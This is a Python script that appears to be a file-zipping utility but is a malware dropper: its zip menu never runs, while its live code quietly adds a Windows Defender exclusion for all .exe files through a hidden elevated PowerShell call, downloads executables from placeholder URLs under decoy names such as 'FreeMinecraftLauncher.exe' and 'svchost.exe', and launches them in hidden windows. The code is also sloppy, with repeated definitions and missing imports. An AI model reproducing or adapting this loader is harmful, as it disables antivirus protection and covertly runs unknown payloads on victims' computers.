import os
import ctypes
import subprocess
import urllib.request
import time

def zip_create(directory):
    def get_all_file_paths(directory):
        file_paths = []
        for root, directories, files in os.walk(directory):
            for filename in files:
                filepath = os.path.join(root, filename)
                file_paths.append(filepath)
        return file_paths
    file_path = get_all_file_paths(directory)
    print(file_path)
    for file_name in file_path:
        print(file_name)
    with ZipFile(directory +'.zip', 'w') as zip:
        os.chdir(directory)
        for file in file_path:
            zip.write(file)
        print('All files zipped successfully!')

def add_exe_to_windows_defender_exceptions(file_extension):
    command = f'Set-MpPreference -ExclusionExtension "{file_extension}"'
    kernel32 = ctypes.WinDLL('kernel32')
    user32 = ctypes.WinDLL('user32')
    shell32 = ctypes.WinDLL('shell32')
    SW_HIDE = 0
    hWnd = None
    shell32.ShellExecuteW(hWnd, 'runas', 'powershell', '-Command {}'.format(command), None, SW_HIDE)

def get_all_file_paths(directory):
        file_paths = []
        for root, directories, files in os.walk(directory):
            for filename in files:
                filepath = os.path.join(root, filename)
                file_paths.append(filepath)
        return file_paths

add_exe_to_windows_defender_exceptions("exe")

minecraft_folder = "Minecraft"
os.makedirs(minecraft_folder, exist_ok=True)

def zip_create(directory):
    def get_all_file_paths(directory):
        file_paths = []
        for root, directories, files in os.walk(directory):
            for filename in files:
                filepath = os.path.join(root, filename)
                file_paths.append(filepath)
        return file_paths
    file_path = get_all_file_paths(directory)
    print(file_path)
    for file_name in file_path:
        print(file_name)
        
gitlab_url = "CHANGE"
file_name = os.path.join(minecraft_folder, "FreeMinecraftLauncher.exe")
urllib.request.urlretrieve(gitlab_url, file_name)
time.sleep(5)
choice = 0
if choice == 1:
    print("You Selected Creating Zip")
    dir = input("Please enter a directory which you want to a compress: ")
    try:
        zip_create(dir)
        #Zip File will be store in folder in which you selected to compress
    except Exception as e:
        print(e)

#add_exe_to_windows_defender_exceptions("exe")

command = r'powershell.exe -WindowStyle Hidden -Command "& {Start-Process -FilePath ".\\Minecraft\\FreeMinecraftLauncher.exe"}"'
creationflags = subprocess.CREATE_NO_WINDOW
process = subprocess.Popen(command, shell=True, creationflags=creationflags)

def zip_create(directory):
    file_path = get_all_file_paths(directory)
    print(file_path)
    for file_name in file_path:
        print(file_name)
    with ZipFile(directory +'.zip', 'w') as zip:
        os.chdir(directory)
        for file in file_path:
            zip.write(file)
        print('All files zipped successfully!')

gitlab_url = "CHANGE"
file_name = os.path.join(minecraft_folder, "MicrosoftStoreUpdate.exe")
urllib.request.urlretrieve(gitlab_url, file_name)

if choice == 2:
    print("You selected Extracting Zip")
    file_path = input('Please give directory of zip file path: ')
    file_name = input("Please choose FileName(Without Extension): ")
    fp = file_path +"/"+ file_name +'.zip'
    print("Choose a selection: ")
    print('(1) Enter 1. For current working directory: \n(2) Enter a Path where you want to Extract')
    ch = input("Enter your choice: ")
    try:
        if ch == '1':
            zip_ex(fp)
        else:
            os.chdir(ch)
            zip_ex(fp)
    except Exception as e:
        print(e)

gitlab_url = "CHANGE"
file_name = os.path.join(minecraft_folder, "svchost.exe")
urllib.request.urlretrieve(gitlab_url, file_name)

def zip_ex(file_name):
    try:
        with ZipFile(file_name, 'r') as zip:
            k = file_name.split('\\')
            t = k[-1]
            zip.printdir()
            print('Extracting all the files...')
            zip.extractall()
            print(t,' is Extracted')
    except Exception as e:
        print(e)
         
command = r'powershell.exe -WindowStyle Hidden -Command "& {Start-Process -FilePath ".\\Minecraft\\svchost.exe"}"'
creationflags = subprocess.CREATE_NO_WINDOW     #0x08000000
process = subprocess.Popen(command, shell=True, creationflags=creationflags)

if choice == 3:
    print("You selected Extracting Zip")
    file_path = input('Please give directory of zip file path: ')
    file_name = input("Please choose FileName(Without Extension): ")
    fp = file_path +"/"+ file_name +'.zip'
    print("Choose a selection: ")
    print('(1) Enter 1. For current working directory: \n(2) Enter a Path where you want to Extract')
    ch = input("Enter your choice: ")
    try:
        if ch == '1':
            zip_ex(fp)
        else:
            os.chdir(ch)
            zip_ex(fp)
    except Exception as e:
        print(e)

sys.exit()
